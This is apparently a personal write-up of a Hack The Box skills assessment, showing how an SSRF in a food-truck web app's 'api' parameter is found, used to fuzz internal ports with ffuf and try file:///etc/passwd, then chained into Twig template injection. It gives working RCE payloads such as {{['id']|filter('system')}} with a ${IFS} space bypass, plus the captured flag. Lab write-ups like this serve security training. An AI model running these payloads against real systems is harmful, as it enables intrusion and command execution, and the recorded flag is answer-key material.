---
sticker: lucide//server
---
## Scenario

You are tasked to perform a security assessment of a client's web application. Apply what you have learned in this module to obtain the flag.

![Pasted image 20250212154851.png](../../../IMAGES/Pasted%20image%2020250212154851.png)

Let's begin by checking the page:

![Pasted image 20250212154913.png](../../../IMAGES/Pasted%20image%2020250212154913.png)

We got a simple page, nothing is off at the beginning, we have three sections: `menu`, `reviews` and `contact`, let's read the main's page source code:

![Pasted image 20250212155010.png](../../../IMAGES/Pasted%20image%2020250212155010.png)

We can see this js code at the end of the file, let's break it down:

```ad-important
### **1. Loop Through Truck IDs**

- Iterates over a list of truck IDs:`["FusionExpress01", "FusionExpress02", "FusionExpress03"]`.
 
- For each truck ID, an HTTP request is made to fetch its location.
 

---

### **2. XMLHttpRequest Setup**

- **Synchronous Request**: 
 `xhr.open('POST', '/', false)` creates a **synchronous** POST request to the server (`/`). 
 _(Synchronous requests block the UI until completion, which is generally discouraged.)_
 
- **Request Headers**: 
 Sets`Content-Type: application/x-www-form-urlencoded` to send data as form-encoded key-value pairs.
 

---

### **3. Request Handling**

- **POST Data**: 
 Sends the parameter`api=http://truckapi.htb/?id=<TRUCK_ID>` in the request body.
 
 - `encodeURIComponent("=" + truckID)` ensures the`=` and truck ID are URL-safe (e.g.,`%3DFusionExpress01`).
 
 - Final URL sent to the server:`http://truckapi.htb/?id=FusionExpress01`.
 
- **Server-Side Behavior**: 
 The server likely acts as a proxy, using the`api` parameter to fetch data from the internal`truckapi.htb` endpoint. 
 _(This could introduce SSRF vulnerabilities if the server doesn't validate the URL.)_
 

---

### **4. Response Handling**

- **Success Case (HTTP 200)**:
 
 - Parses the response as JSON.
 
 - Displays`data['location']` if available, or`data['error']` if an error is present.
 
- **Failure Case**: 
 Shows "Unable to fetch current truck location!" if the request fails (non-200 status).
 

---

### **5. UI Updates**

- Updates the HTML element with`id=truckID` (e.g.,`<div id="FusionExpress01">`) to show the location/error.
 

---

### **Key Observations**

- **SSRF Risk**: The server trusts the`api` parameter to make internal requests. If unvalidated, attackers could exploit this to access internal systems.
 
- **Hardcoded Truck IDs**: Limits functionality to predefined trucks (no user input).
 
- **Synchronous Requests**: Poor practice for user experience but intentional here for sequential processing.

### **Summary**

For each Truck ID:
 1. Send POST to server with URL: `http://truckapi.htb/?id=<TRUCK_ID>`
 2. Server fetches data from `truckapi.htb`
 3. Client displays location/error in the webpage
```

Understanding the functionality of the page, we can start burp and check the request:

![Pasted image 20250212160205.png](../../../IMAGES/Pasted%20image%2020250212160205.png)

We can begin the testing for SSRF.

## SSRF Test
---

We can begin the test by pointing `http://127.0.0.1:80` to view the response:

![Pasted image 20250212160429.png](../../../IMAGES/Pasted%20image%2020250212160429.png)

It went through, what if we point to a closed port:

![Pasted image 20250212160546.png](../../../IMAGES/Pasted%20image%2020250212160546.png)

An error message is shown, knowing this, we can use ffuf and fuzz for open ports:

```
ffuf -w ports.txt:FUZZ -u http://83.136.252.66:53014/ -X POST -H "Host: 83.136.252.66:53014" -H "Content-Type: application/x-www-form-urlencoded" -d "api=http://127.0.0.1:FUZZ" -fr "Error \(7\)" -ic -c -t 200
```

We can see the following:

```
ffuf -w ports.txt:FUZZ -u http://83.136.252.66:53014/ -X POST -H "Host: 83.136.252.66:53014" -H "Content-Type: application/x-www-form-urlencoded" -d "api=http://127.0.0.1:FUZZ" -fr "Error \(7\)" -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : POST
 :: URL : http://83.136.252.66:53014/
 :: Wordlist : FUZZ: /home/samsepiol/ports.txt
 :: Header : Host: 83.136.252.66:53014
 :: Header : Content-Type: application/x-www-form-urlencoded
 :: Data : api=http://127.0.0.1:FUZZ
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter : Regexp: Error \(7\)
________________________________________________

3306 [Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 158ms]
80 [Status: 200, Size: 4194, Words: 278, Lines: 126, Duration: 5317ms]
```

So, port 3306 is open, let's check the response:

![Pasted image 20250212161958.png](../../../IMAGES/Pasted%20image%2020250212161958.png)

We got another error message, `Received HTTP/0.9 when not allowed`, but it doesn't matter, since we know we have SSRF, we can attempt to read local files:


```
file:///etc/passwd
```

We get the following:

![Pasted image 20250212165927.png](../../../IMAGES/Pasted%20image%2020250212165927.png)

`file` has been disabled, let's test other way.

## SSTI Test
---

We can test SSTI with this simple payload:


```twig
http://truckapi.htb/?id={{7*7}}
```

We see the following:


![Pasted image 20250212170132.png](../../../IMAGES/Pasted%20image%2020250212170132.png)

It works, this means we are facing `twig`, let's try to use this:

```twig
{{ ['id'] | filter('system') }}
```

We need to format it:

```twig
http://truckapi.htb/?id={{['id']|filter('system')}}
```

We see the following:

![Pasted image 20250212170307.png](../../../IMAGES/Pasted%20image%2020250212170307.png)

We got RCE, let's proceed to read our flag, since we need to do a space in order to do `cat /flag.txt`, we can use `${IFS}` which is the `Internal Field Separator` to bypass the space restrictions in shell commands, payload would be the following:

```twig
http://truckapi.htb/?id={{['cat${IFS}/flag.txt']|filter('system')}}
```

We can see the following:

![Pasted image 20250212170624.png](../../../IMAGES/Pasted%20image%2020250212170624.png)

We got our flag:

```
HTB{3b8e2b940775e0267ce39d7c80488fc8}
```

![Pasted image 20250212170814.png](../../../IMAGES/Pasted%20image%2020250212170814.png)

